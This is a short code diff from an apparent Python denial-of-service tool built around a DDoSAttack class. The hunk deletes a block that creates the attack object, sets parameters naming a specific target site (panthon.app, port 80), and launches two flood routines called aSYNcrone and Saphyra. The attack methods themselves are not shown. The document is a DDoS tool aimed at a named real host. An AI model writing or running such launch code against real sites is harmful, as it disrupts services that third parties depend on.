@@ -59,19 +59,3 @@ class DDoSAttack:
         else:
             logging.error(f"Unknown platform: {sys.platform}")
             return None
-
-
-# Create DDoSAttack object
-attack = DDoSAttack()
-
-# aSYNcrone attack parameters
-target_url_async = "https://panthon.app"
-target_port_async = 80
-num_connections_async = 1
-
-# Saphyra attack parameters
-target_url_saphyra = "https://panthon.app"
-
-# Launch attacks
-attack.aSYNcrone_attack(target_url_async, target_port_async, num_connections_async)
-attack.saphyra_attack(target_url_saphyra)
